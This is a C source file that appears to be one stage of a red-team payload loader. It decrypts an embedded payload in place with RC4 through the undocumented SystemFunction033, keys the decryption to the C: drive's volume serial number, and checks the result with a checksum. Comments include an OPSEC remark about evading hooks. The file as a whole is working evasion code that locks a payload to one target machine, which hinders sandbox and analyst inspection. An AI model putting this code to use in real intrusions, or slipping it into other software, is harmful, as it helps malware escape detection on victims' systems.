/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>

/*
 * We're going to rely on an undocumented Win32 function to do the RC4 decrypt
 * https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/
 *
 * OPSEC Note: outside of a VERY size-constrained situation, I would prefer to
 * just have RC4 functions in my code without the overhead and observation
 * (e.g., hooking) opportunity of a (rarely used?) Win32 undocumented function.
 */
typedef struct {
	DWORD  length;
	DWORD  maxlen;
	char * buffer;
} USTRING;

WINBASEAPI LONG WINAPI ADVAPI32$SystemFunction033(USTRING * data, USTRING * key);

/*
 * Adler32 checksum to check if our decrypted data is what we likely intended.
 * https://www.ietf.org/rfc/rfc1950.txt
 */
DWORD checksum(unsigned char * buffer, DWORD length) {
	DWORD a = 1, b = 0;

	for (int x = 0; x < length; x++) {
		a = (a + buffer[x]) % 65521;
		b = (a + b) % 65521;
	}

	return (b << 16) + a;
}

/*
 * Derive an environment key using GetVolumeInformationA
 */
WINBASEAPI WINBOOL WINAPI KERNEL32$GetVolumeInformationA (LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer,
			DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength,
			LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);

typedef struct {
	DWORD a;
	DWORD b;
} ENVKEY;

ENVKEY DeriveKeySerialNo() {
	ENVKEY result;

	/* get the volume serial number and copy it to our key buffer */
	DWORD volumeSerialNumber = 0;
	KERNEL32$GetVolumeInformationA("c:\\", NULL, 0, &volumeSerialNumber, NULL, NULL, NULL, 0);

	/* we're going through this gymnastic because rc4 wants at least 40b (5 bytes) to encrypt. */
	result.a = volumeSerialNumber;
	result.b = volumeSerialNumber;

	return result;
}

/*
 * _VERIFY is the result of "prepsum" from loader.spec.
 */
typedef struct {
	DWORD checksum;
	char  value[];
} _VERIFY;

/*
 * We are going to accept a buffer from the parent loader, to give the parent control over
 * how to allocate (and free) the memory for our decryption.
 *
 * char * dst    - the destination where our decrypted payload will live
 *                 (note: we expect this buffer is pre-populated with our ciphertext, we
 *                  decrypt in place)
 * int    len    - the length of our ciphertext. It better be <= the size of dst.
 * int  * outlen - a ptr to a var to populate with the size of the decrypted content.
 *                 This parameter is optional and a NULL value is OK.
 *
 * Returns a pointer to the decrypted VALUE if successful
 * Returns NULL if decryption or verification failed
 */
char * go(char * dst, int len, int * outlen) {
	ENVKEY      key;

	USTRING     u_data;
	USTRING     u_key;

	_VERIFY   * hdr;
	int         ddlen;
	int         ddsum;

	/* This is where we bring our environment-derived key into the mix.
	 * Here, we are using the c:\ drive's serial number as a simple key. */
	key = DeriveKeySerialNo();

	/* setup our USTRING data structures for RC4 decrypt */
	u_data.length = len;
	u_data.buffer = dst;

	u_key.length  = sizeof(ENVKEY);
	u_key.buffer  = (char *)&key;

	/* call the System033 function to do an RC4 decrypt */
	ADVAPI32$SystemFunction033(&u_data, &u_key);

	/* now, we need to *verify* our result. */
	hdr  = (_VERIFY *)dst;

	/* decrypted data length */
	ddlen = len - sizeof(DWORD);

	/* store our output length too, if an outptr was provided */
	if (outlen != NULL)
		*outlen = ddlen;

	/* checksum for our decrypted data */
	ddsum = checksum((unsigned char *)hdr->value, ddlen);

	/* this succeeded if the packed-in and calculcated checksums match */
	if (hdr->checksum == ddsum) {
		return hdr->value;
	}
	else {
		return NULL;
	}
}
